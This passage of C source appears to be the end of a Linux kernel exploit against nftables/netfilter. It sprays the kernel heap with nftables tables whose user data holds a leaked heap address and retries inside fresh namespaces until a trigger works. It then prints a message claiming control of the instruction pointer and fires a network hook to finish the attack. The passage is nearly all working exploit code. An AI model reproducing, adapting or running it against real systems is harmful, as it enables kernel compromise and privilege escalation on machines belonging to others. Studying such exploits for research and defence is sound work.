        nftnl_table_set_data(table, NFTNL_TABLE_USERDATA, data, 96);
        
        tables[i] = table;
    }

    batch = mnl_nlmsg_batch_start(buf, buf_size);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    for(int i = 0; i < TABLE_SPRAY; i++){
        nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, 0, seq++);
        nftnl_table_nlmsg_build_payload(nlh, tables[i]);
        mnl_nlmsg_batch_next(batch);
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    int o = 0;

    data[o++] = heap_addr2;
    data[o++] = 0;

    for(int i = 0; i < TABLE_SPRAY; i++){
        char *table_name;
        asprintf(&table_name, "st32_%02hx", i);

        struct nftnl_table * table = nftnl_table_alloc();
        nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
        nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);
        nftnl_table_set_data(table, NFTNL_TABLE_USERDATA, data, 32);
        
        tables[i] = table;
    }

    batch = mnl_nlmsg_batch_start(buf, buf_size);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    for(int i = 0; i < TABLE_SPRAY; i++){
        nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, 0, seq++);
        nftnl_table_nlmsg_build_payload(nlh, tables[i]);
        mnl_nlmsg_batch_next(batch);
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    usleep(10*1000);
}

void netfilter(){
    save_state();

    while(1){
        new_ns();
	    net_if("lo", -1, IFF_UP, true);
        
        nl = mnl_socket_open(NETLINK_NETFILTER);
        if (nl == NULL) {
            err(1, "mnl_socket_open");
        }

        if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
            perror("mnl_socket_bind");
            exit(EXIT_FAILURE);
        }

        portid = mnl_socket_get_portid(nl);

        if(!trig()) break;
    }

    printf("[*] RIP control\n");

    int sfd = 0;

    /* Set up server at TRIG_PORT in a new process */
    sfd = fork();
    if(sfd == 0) {
        setup_trig_server();
        exit(0);
    }

    /* Trigger the network hook */
    trig_net_sock();

    sleep(1);

    mnl_socket_close(nl);
}

int main(int argc, char ** argv)
{
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);

    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        perror("[-] sched_setaffinity()");
        exit(EXIT_FAILURE);
    }

    netfilter();

    return 0;
}